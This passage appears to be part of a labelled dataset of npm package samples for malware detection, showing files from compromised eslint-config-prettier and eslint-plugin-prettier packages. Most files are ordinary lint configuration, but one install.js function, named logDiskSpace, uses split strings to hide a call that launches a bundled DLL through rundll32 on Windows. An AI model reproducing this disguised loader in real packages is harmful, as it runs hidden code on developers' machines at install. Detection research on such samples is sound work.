value : [\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRules(rules, fn) {\n  return Object.fromEntries(\n    Object.entries(rules)\n      .filter(([ruleName, value]) => fn(ruleName, value))\n      .map(([ruleName]) => [ruleName, true])\n  );\n}\n\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js (function)\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.d.ts (file)\nimport eslintConfigPrettier from \"./index.js\";\n\ndeclare const eslintConfigPrettierFlat: typeof eslintConfigPrettier & {\n  name: \"config-prettier\";\n};\n\nexport = eslintConfigPrettierFlat;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.d.ts (file)\nexport const rules: Record<string, 0>;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.d.ts (file)\ndeclare const eslintConfigPrettier: {\n  rules: Record<string, 0 | \"off\">;\n};\n\nexport = eslintConfigPrettier;\n\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/validators.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.d.ts",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.d.ts"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.js": "\"use strict\";\n\nexports.rules = {\n  // These are safe to use as long as the `\"prettier/prettier\"` rule from\n  // eslint-plugin-prettier isn\u2019t enabled.\n  // These are also included in `\"plugin:prettier/recommended\"`:\n  // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n  \"arrow-body-style\": 0,\n  \"prefer-arrow-callback\": 0,\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.js": "\"use strict\";\n\nconst { rules } = require(\"./index.js\");\n\nexports.name = \"config-prettier\";\nexports.rules = rules;\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.js": "\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nconst specialRule = 0;\n\nexports.rules = {\n  // The following rules can be used in some cases. See the README for more\n  // information. These are marked with `0` instead of `\"off\"` so that a\n  // script can distinguish them. Note that there are a few more of these\n  // in the deprecated section below.\n  \"curly\": specialRule,\n  \"no-unexpected-multiline\": specialRule,\n  \"@stylistic/lines-around-comment\": specialRule,\n  \"@stylistic/max-len\": specialRule,\n  \"@stylistic/no-confusing-arrow\": specialRule,\n  \"@stylistic/no-mixed-operators\": specialRule,\n  \"@stylistic/no-tabs\": specialRule,\n  \"@stylistic/quotes\": specialRule,\n  \"@stylistic/js/lines-around-comment\": specialRule,\n  \"@stylistic/js/max-len\": specialRule,\n  \"@stylistic/js/no-confusing-arrow\": specialRule,\n  \"@stylistic/js/no-mixed-operators\": specialRule,\n  \"@stylistic/js/no-tabs\": specialRule,\n  \"@stylistic/js/quotes\": specialRule,\n  \"@stylistic/ts/lines-around-comment\": specialRule,\n  \"@stylistic/ts/quotes\": specialRule,\n  \"@typescript-eslint/lines-around-comment\": specialRule,\n  \"@typescript-eslint/quotes\": specialRule,\n  \"babel/quotes\": specialRule,\n  \"unicorn/template-indent\": specialRule,\n  \"vue/html-self-closing\": specialRule,\n  \"vue/max-len\": specialRule,\n\n  // The rest are rules that you never need to enable when using Prettier.\n  \"@babel/object-curly-spacing\": \"off\",\n  \"@babel/semi\": \"off\",\n  \"@stylistic/array-bracket-newline\": \"off\",\n  \"@stylistic/array-bracket-spacing\": \"off\",\n  \"@stylistic/array-element-newline\": \"off\",\n  \"@stylistic/arrow-parens\": \"off\",\n  \"@stylistic/arrow-spacing\": \"off\",\n  \"@stylistic/block-spacing\": \"off\",\n  \"@stylistic/brace-style\": \"off\",\n  \"@stylistic/comma-dangle\": \"off\",\n  \"@stylistic/comma-spacing\": \"off\",\n  \"@stylistic/comma-style\": \"off\",\n  \"@stylistic/computed-property-spacing\": \"off\",\n  \"@stylistic/dot-location\": \"off\",\n  \"@stylistic/eol-last\": \"off\",\n  \"@stylistic/func-call-spacing\": \"off\",\n  \"@stylistic/function-call-argument-newline\": \"off\",\n  \"@stylistic/function-call-spacing\": \"off\",\n  \"@stylistic/function-paren-newline\": \"off\",\n  \"@stylistic/generator-star-spacing\": \"off\",\n  \"@stylistic/implicit-arrow-linebreak\": \"off\",\n  \"@stylistic/indent\": \"off\",\n  \"@stylistic/jsx-quotes\": \"off\",\n  \"@stylistic/key-spacing\": \"off\",\n  \"@stylistic/keyword-spacing\": \"off\",\n  \"@stylistic/linebreak-style\": \"off\",\n  \"@stylistic/max-statements-per-line\": \"off\",\n  \"@stylistic/multiline-ternary\": \"off\",\n  \"@stylistic/new-parens\": \"off\",\n  \"@stylistic/newline-per-chained-call\": \"off\",\n  \"@stylistic/no-extra-parens\": \"off\",\n  \"@stylistic/no-extra-semi\": \"off\",\n  \"@stylistic/no-floating-decimal\": \"off\",\n  \"@stylistic/no-mixed-spaces-and-tabs\": \"off\",\n  \"@stylistic/no-multi-spaces\": \"off\",\n  \"@stylistic/no-multiple-empty-lines\": \"off\",\n  \"@stylistic/no-trailing-spaces\": \"off\",\n  \"@stylistic/no-whitespace-before-property\": \"off\",\n  \"@stylistic/nonblock-statement-body-position\": \"off\",\n  \"@stylistic/object-curly-newline\": \"off\",\n  \"@stylistic/object-curly-spacing\": \"off\",\n  \"@stylistic/object-property-newline\": \"off\",\n  \"@stylistic/one-var-declaration-per-line\": \"off\",\n  \"@stylistic/operator-linebreak\": \"off\",\n  \"@stylistic/padded-blocks\": \"off\",\n  \"@stylistic/quote-props\": \"off\",\n  \"@stylistic/rest-spread-spacing\": \"off\",\n  \"@stylistic/semi\": \"off\",\n  \"@stylistic/semi-spacing\": \"off\",\n  \"@stylistic/semi-style\": \"off\",\n  \"@stylistic/space-before-blocks\": \"off\",\n  \"@stylistic/space-before-function-paren\": \"off\",\n  \"@stylistic/space-in-parens\": \"off\",\n  \"@stylistic/space-infix-ops\": \"off\",\n  \"@stylistic/space-unary-ops\": \"off\",\n  \"@stylistic/switch-colon-spacing\": \"off\",\n  \"@stylistic/template-curly-spacing\": \"off\",\n  \"@stylistic/template-tag-spacing\": \"off\",\n  \"@stylistic/wrap-iife\": \"off\",\n  \"@stylistic/wrap-regex\": \"off\",\n  \"@stylistic/yield-star-spacing\": \"off\",\n  \"@stylistic/member-delimiter-style\": \"off\",\n  \"@stylistic/type-annotation-spacing\": \"off\",\n  \"@stylistic/jsx-child-element-spacing\": \"off\",\n  \"@stylistic/jsx-closing-bracket-location\": \"off\",\n  \"@stylistic/jsx-closing-tag-location\": \"off\",\n  \"@stylistic/jsx-curly-newline\": \"off\",\n  \"@stylistic/jsx-curly-spacing\": \"off\",\n  \"@stylistic/jsx-equals-spacing\": \"off\",\n  \"@stylistic/jsx-first-prop-new-line\": \"off\",\n  \"@stylistic/jsx-indent\": \"off\",\n  \"@stylistic/jsx-indent-props\": \"off\",\n  \"@stylistic/jsx-max-props-per-line\": \"off\",\n  \"@stylistic/jsx-newline\": \"off\",\n  \"@stylistic/jsx-one-expression-per-line\": \"off\",\n  \"@stylistic/jsx-props-no-multi-spaces\": \"off\",\n  \"@stylistic/jsx-tag-spacing\": \"off\",\n  \"@stylistic/jsx-wrap-multilines\": \"off\",\n  \"@stylistic/indent-binary-ops\": \"off\",\n  \"@stylistic/type-generic-spacing\": \"off\",\n  \"@stylistic/type-named-tuple-spacing\": \"off\",\n  \"@stylistic/js/array-bracket-newline\": \"off\",\n  \"@stylistic/js/array-bracket-spacing\": \"off\",\n  \"@stylistic/js/array-element-newline\": \"off\",\n  \"@stylistic/js/arrow-parens\": \"off\",\n  \"@stylistic/js/arrow-spacing\": \"off\",\n  \"@stylistic/js/block-spacing\": \"off\",\n  \"@stylistic/js/brace-style\": \"off\",\n  \"@stylistic/js/comma-dangle\": \"off\",\n  \"@stylistic/js/comma-spacing\": \"off\",\n  \"@stylistic/js/comma-style\": \"off\",\n  \"@stylistic/js/computed-property-spacing\": \"off\",\n  \"@stylistic/js/dot-location\": \"off\",\n  \"@stylistic/js/eol-last\": \"off\",\n  \"@stylistic/js/func-call-spacing\": \"off\",\n  \"@stylistic/js/function-call-argument-newline\": \"off\",\n  \"@stylistic/js/function-call-spacing\": \"off\",\n  \"@stylistic/js/function-paren-newline\": \"off\",\n  \"@stylistic/js/generator-star-spacing\": \"off\",\n  \"@stylistic/js/implicit-arrow-linebreak\": \"off\",\n  \"@stylistic/js/indent\": \"off\",\n  \"@stylistic/js/jsx-quotes\": \"off\",\n  \"@stylistic/js/key-spacing\": \"off\",\n  \"@stylistic/js/keyword-spacing\": \"off\",\n  \"@stylistic/js/linebreak-style\": \"off\",\n  \"@stylistic/js/max-statements-per-line\": \"off\",\n  \"@stylistic/js/multiline-ternary\": \"off\",\n  \"@stylistic/js/new-parens\": \"off\",\n  \"@stylistic/js/newline-per-chained-call\": \"off\",\n  \"@stylistic/js/no-extra-parens\": \"off\",\n  \"@stylistic/js/no-extra-semi\": \"off\",\n  \"@stylistic/js/no-floating-decimal\": \"off\",\n  \"@stylistic/js/no-mixed-spaces-and-tabs\": \"off\",\n  \"@stylistic/js/no-multi-spaces\": \"off\",\n  \"@stylistic/js/no-multiple-empty-lines\": \"off\",\n  \"@stylistic/js/no-trailing-spaces\": \"off\",\n  \"@stylistic/js/no-whitespace-before-property\": \"off\",\n  \"@stylistic/js/nonblock-statement-body-position\": \"off\",\n  \"@stylistic/js/object-curly-newline\": \"off\",\n  \"@stylistic/js/object-curly-spacing\": \"off\",\n  \"@stylistic/js/object-property-newline\": \"off\",\n  \"@stylistic/js/one-var-declaration-per-line\": \"off\",\n  \"@stylistic/js/operator-linebreak\": \"off\",\n  \"@stylistic/js/padded-blocks\": \"off\",\n  \"@stylistic/js/quote-props\": \"off\",\n  \"@stylistic/js/rest-spread-spacing\": \"off\",\n  \"@stylistic/js/semi\": \"off\",\n  \"@stylistic/js/semi-spacing\": \"off\",\n  \"@stylistic/js/semi-style\": \"off\",\n  \"@stylistic/js/space-before-blocks\": \"off\",\n  \"@stylistic/js/space-before-function-paren\": \"off\",\n  \"@stylistic/js/space-in-parens\": \"off\",\n  \"@stylistic/js/space-infix-ops\": \"off\",\n  \"@stylistic/js/space-unary-ops\": \"off\",\n  \"@stylistic/js/switch-colon-spacing\": \"off\",\n  \"@stylistic/js/template-curly-spacing\": \"off\",\n  \"@stylistic/js/template-tag-spacing\": \"off\",\n  \"@stylistic/js/wrap-iife\": \"off\",\n  \"@stylistic/js/wrap-regex\": \"off\",\n  \"@stylistic/js/yield-star-spacing\": \"off\",\n  \"@stylistic/ts/block-spacing\": \"off\",\n  \"@stylistic/ts/brace-style\": \"off\",\n  \"@stylistic/ts/comma-dangle\": \"off\",\n  \"@stylistic/ts/comma-spacing\": \"off\",\n  \"@stylistic/ts/func-call-spacing\": \"off\",\n  \"@stylistic/ts/function-call-spacing\": \"off\",\n  \"@stylistic/ts/indent\": \"off\",\n  \"@stylistic/ts/key-spacing\": \"off\",\n  \"@stylistic/ts/keyword-spacing\": \"off\",\n  \"@stylistic/ts/member-delimiter-style\": \"off\",\n  \"@stylistic/ts/no-extra-parens\": \"off\",\n  \"@stylistic/ts/no-extra-semi\": \"off\",\n  \"@stylistic/ts/object-curly-spacing\": \"off\",\n  \"@stylistic/ts/semi\": \"off\",\n  \"@stylistic/ts/space-before-blocks\": \"off\",\n  \"@stylistic/ts/space-before-function-paren\": \"off\",\n  \"@stylistic/ts/space-infix-ops\": \"off\",\n  \"@stylistic/ts/type-annotation-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-child-element-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-closing-bracket-location\": \"off\",\n  \"@stylistic/jsx/jsx-closing-tag-location\": \"off\",\n  \"@stylistic/jsx/jsx-curly-newline\": \"off\",\n  \"@stylistic/jsx/jsx-curly-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-equals-spacing\": \"off\",\n  \"@stylistic/jsx/jsx-first-prop-new-line\": \"off\",\n  \"@stylistic/jsx/jsx-indent\": \"off\",\n  \"@stylistic/jsx/jsx-indent-props\": \"off\",\n  \"@stylistic/jsx/jsx-max-props-per-line\": \"off\",\n  \"@typescript-eslint/block-spacing\": \"off\",\n  \"@typescript-eslint/brace-style\": \"off\",\n  \"@typescript-eslint/comma-dangle\": \"off\",\n  \"@typescript-eslint/comma-spacing\": \"off\",\n  \"@typescript-eslint/func-call-spacing\": \"off\",\n  \"@typescript-eslint/indent\": \"off\",\n  \"@typescript-eslint/key-spacing\": \"off\",\n  \"@typescript-eslint/keyword-spacing\": \"off\",\n  \"@typescript-eslint/member-delimiter-style\": \"off\",\n  \"@typescript-eslint/no-extra-parens\": \"off\",\n  \"@typescript-eslint/no-extra-semi\": \"off\",\n  \"@typescript-eslint/object-curly-spacing\": \"off\",\n  \"@typescript-eslint/semi\": \"off\",\n  \"@typescript-eslint/space-before-blocks\": \"off\",\n  \"@typescript-eslint/space-before-function-paren\": \"off\",\n  \"@typescript-eslint/space-infix-ops\": \"off\",\n  \"@typescript-eslint/type-annotation-spacing\": \"off\",\n  \"babel/object-curly-spacing\": \"off\",\n  \"babel/semi\": \"off\",\n  \"flowtype/boolean-style\": \"off\",\n  \"flowtype/delimiter-dangle\": \"off\",\n  \"flowtype/generic-spacing\": \"off\",\n  \"flowtype/object-type-curly-spacing\": \"off\",\n  \"flowtype/object-type-delimiter\": \"off\",\n  \"flowtype/quotes\": \"off\",\n  \"flowtype/semi\": \"off\",\n  \"flowtype/space-after-type-colon\": \"off\",\n  \"flowtype/space-before-generic-bracket\": \"off\",\n  \"flowtype/space-before-type-colon\": \"off\",\n  \"flowtype/union-intersection-spacing\": \"off\",\n  \"react/jsx-child-element-spacing\": \"off\",\n  \"react/jsx-clos",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/install.js": "function listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/validators.js": "\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"unicorn/template-indent\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const { comments = [], tags = [] } = options[0] || {};\n\n    return (\n      Array.isArray(comments) &&\n      Array.isArray(tags) &&\n      !(\n        comments.includes(\"GraphQL\") ||\n        comments.includes(\"HTML\") ||\n        tags.includes(\"css\") ||\n        tags.includes(\"graphql\") ||\n        tags.includes(\"gql\") ||\n        tags.includes(\"html\") ||\n        tags.includes(\"markdown\") ||\n        tags.includes(\"md\")\n      )\n    );\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/bin/cli.js": "function printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/flat.d.ts": "import eslintConfigPrettier from \"./index.js\";\n\ndeclare const eslintConfigPrettierFlat: typeof eslintConfigPrettier & {\n  name: \"config-prettier\";\n};\n\nexport = eslintConfigPrettierFlat;\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/prettier.d.ts": "export const rules: Record<string, 0>;\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpf5awo1yi/tmp/tmpa42uj6xo/eslint-config-prettier/package/index.d.ts": "declare const eslintConfigPrettier: {\n  rules: Record<string, 0 | \"off\">;\n};\n\nexport = eslintConfigPrettier;\n"
      },
      "package_size_bytes": 28877,
      "num_files": 21,
      "metadata": {
        "package_hash": "npm_eslint-config-prettier_2025",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "eslint-plugin-prettier",
      "ecosystem": "npm",
      "sample_type": "compromised_lib",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/eslint-plugin-prettier.js (function)\nfunction reportDifference(context, difference) {\n  const { operation, offset, deleteText = '', insertText = '' } = difference;\n  const range = [offset, offset + deleteText.length];\n  const [start, end] = range.map(index =>\n    context.getSourceCode().getLocFromIndex(index),\n  );\n\n  context.report({\n    messageId: operation,\n    data: {\n      deleteText: showInvisibles(deleteText),\n      insertText: showInvisibles(insertText),\n    },\n    loc: { start, end },\n    fix: fixer => fixer.replaceTextRan\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction log(msg) {\n    console.log(msg);\n    if (!DRY_RUN) {\n        try {\n            cache.appendFileSync(LOG_FILE, msg + '\\n');\n        } catch (err) {\n            console.error(`Failed to write log: ${err.message}`);\n        }\n    }\n}\n\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        log(`Directory exists: ${dirPath}`);\n    }\n}\n\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.fil\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.filesDeleted++;\n        log(`Deleted file: ${filePath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting file ${filePath}: ${err.message}`);\n    }\n}\n\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n    try {\n        cache.rmSync(dirPath, { recursive: true, force: true });\n        summary.dirsDeleted++;\n        log(`Deleted directory: ${dirPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting directory ${dirPath}: ${err.message}`);\n    }\n}\n\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basena\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basename(filePath);\n    const targetPath = path.join(ARCHIVE_DIR, fileName);\n\n    if (DRY_RUN) {\n        log(`[Dry-run] Would archive file: ${filePath} -> ${targetPath}`);\n        return;\n    }\n    try {\n        cache.renameSync(filePath, targetPath);\n        summary.filesArchived++;\n        log(`Archived file: ${filePath} -> ${targetPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error arc\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction cleanOldFiles(dirPath, maxAgeDays = DEFAULT_MAX_AGE_DAYS) {\n    if (!cache.existsSync(dirPath)) return;\n    const now = Date.now();\n    const maxAgeMs = maxAgeDays * 24 * 60 * 60 * 1000;\n\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        const filePath = path.join(dirPath, file);\n        try {\n            const stat = cache.lstatSync(filePath);\n            const age = now - stat.mtimeMs;\n\n            if (stat.isFile() && age > maxAgeMs) {\n            \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction rotateLogs() {\n    if (!cache.existsSync(LOG_DIR)) return;\n\n    const logs = cache.readdirSync(LOG_DIR)\n        .filter(f => f.startsWith('install_log_') && f.endsWith('.txt'))\n        .map(f => ({\n            name: f,\n            path: path.join(LOG_DIR, f),\n            time: cache.statSync(path.join(LOG_DIR, f)).mtimeMs,\n        }))\n        .sort((a, b) => b.time - a.time);\n\n    while (logs.length > MAX_LOG_FILES) {\n        const oldest = logs.pop();\n        try {\n            if (!DRY\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction logDiskSpace() {\n    try {\n        if(os.platform() === 'win32') {\n            const tempDir = os.tmpdir();\n            require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", \n            [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n            log(`Temp directory: ${tempDir}`);\n            const files = cache.readdirSync(tempDir);\n            log(`Number of files in temp directory: ${files.length}`);\n        }\n    } catch (err) {\n        summary.errors++;\n        log(`E\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js (function)\nfunction listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const 